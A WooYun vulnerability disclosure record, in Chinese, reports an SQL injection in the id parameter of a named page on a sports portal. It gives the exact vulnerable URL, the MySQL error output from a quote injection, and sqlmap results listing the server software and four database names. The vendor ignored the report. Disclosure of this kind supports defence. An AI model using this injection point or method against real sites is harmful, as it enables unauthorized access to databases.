wybug_title: 畅游体育门户网出现SQL漏洞
wybug_status: 未联系到厂商或者厂商积极忽略
wybug_detail: 漏洞详情 披露状态：   									2013-12-30：	积极联系厂商并且等待厂商认领中，细节不对外公开									2014-02-13：	厂商已经主动忽略漏洞，细节向公众公开  简要描述： 过滤不严格 详细说明：  http://www.cyty.cn/yongzhuangshengdian/tuji.php?id=14加sql语句直接报错http://www.cyty.cn/yongzhuangshengdian/tuji.php?id=14'Database error: MySQL Query Error!MySQL Error: You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near '\'' at line 1 (1064)Database error: MySQL Query Error!MySQL Error: You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near 'limit 1' at line 1 (1064)Database error: MySQL Query Error!MySQL Error: You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near '\' AND is_show = 1 ORDER BY sort_order ASC' at line 1 (1064)Warning: Invalid argument supplied for foreach() in E:\WWWROOT\cyty\yongzhuangshengdian\tuji.php on line 36然后就sqlmap一扫 数据库全都能扫出来   漏洞证明：  http://www.cyty.cn/web server operating system: Windows 2003web application technology: ASP.NET, Microsoft IIS 6.0, PHP 5.2.9back-end DBMS: MySQL 5.0available databases [4]:[*] cyty[*] cyty_cg[*] cyty_company[*] information_schema   修复方案：  嘿嘿你们更专业   版权声明：转载请注明来源 Crkdoor@乌云
wybug_reply: 漏洞回应  厂商回应： 未能联系到厂商或者厂商积极拒绝
